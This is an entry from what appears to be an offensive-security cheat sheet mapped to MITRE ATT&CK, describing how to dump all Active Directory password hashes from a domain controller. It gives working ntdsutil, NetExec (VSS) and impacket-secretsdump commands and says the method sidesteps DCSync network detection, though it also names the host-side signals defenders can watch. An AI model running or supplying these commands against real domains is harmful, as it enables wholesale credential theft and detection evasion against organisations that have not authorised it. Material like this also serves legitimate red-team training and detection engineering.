---
id: ntds-ntdsutil
title: NTDS.dit dump on the DC (ntdsutil / VSS, offline)
section: DCSync / NTDS dump (needs DA or replication rights)
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1003.003]
platform: [windows]
source: hacktheplanet §"DCSync / NTDS dump"
pair: ntds-ntdsutil-4688
---

With code execution on a DC (not just replication rights) you can take the whole
hash store by copying `NTDS.dit` + the SYSTEM hive out of a shadow copy — no
replication traffic, so it sidesteps the `4662` DCSync detection entirely. The
tell moves to the host: `ntdsutil`/`vssadmin` running and a shadow copy being
created. Parse the looted files offline with secretsdump.

```sh
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
nxc smb {{rhost}} -u {{user}} -p {{password}} --ntds vss
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
